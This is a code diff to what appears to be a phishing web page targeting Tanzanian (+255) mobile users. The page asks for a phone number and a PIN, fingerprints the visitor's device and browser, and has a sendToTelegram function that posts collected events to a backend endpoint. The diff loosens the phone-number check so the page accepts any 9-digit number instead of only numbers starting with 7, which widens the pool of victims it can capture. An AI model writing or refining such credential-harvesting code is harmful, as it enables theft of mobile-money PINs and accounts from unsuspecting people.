@@ -252,11 +252,11 @@ opacity:1;
 
 <div class="phone-group">
 <div class="prefix">+255</div>
-<input id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="7XXXXXXXX">
+<input id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="XXXXXXXXX">
 </div>
 
 <div class="warning">
-Enter your 9-digit number starting with 7.
+Enter your 9-digit mobile number.
 </div>
 
 <label>Enter your PIN</label>
@@ -372,7 +372,6 @@ else if(/iPhone|iPad/i.test(ua)) device="iOS"
 if(/Chrome/i.test(ua)) device+=" | Chrome"
 else if(/Safari/i.test(ua)) device+=" | Safari"
 
-
 async function sendToTelegram(eventName){
 
 fetch("/api/sendTelegram",{
@@ -407,8 +406,6 @@ let v=e.target.value.replace(/\D/g,"")
 
 if(v.startsWith("255")) v=v.slice(3)
 if(v.startsWith("0")) v=v.slice(1)
-
-if(v[0]!=="7") v="7"+v.slice(1)
 
 v=v.slice(0,9)
 
